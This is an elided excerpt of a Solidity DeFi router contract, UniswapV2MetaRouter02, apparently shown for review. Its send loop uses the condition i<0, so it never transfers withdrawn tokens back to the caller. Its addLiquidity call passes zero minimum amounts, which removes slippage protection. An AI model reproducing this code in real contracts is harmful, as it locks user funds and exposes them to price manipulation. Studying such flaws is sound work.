...
contract UniswapV2MetaRouter02 is Ownable {
    ...
    function send(address[] memory _tokens) internal{
        for(uint i; i<0; i++){
            address _token = _tokens[i];
            address _bank = bank[_token];
            if(_bank != address(0))
                IERC20(_token).transfer(msg.sender, withdrawFromBank(_token,_bank));
            else
    ...
    function addLiquidity(
        ...
        (amountA, amountB, liquidity) = IUniswapV2Router02(router).addLiquidity(bankTokenA, bankTokenB, amountADesired, amountBDesired, 0, 0, to, deadline);
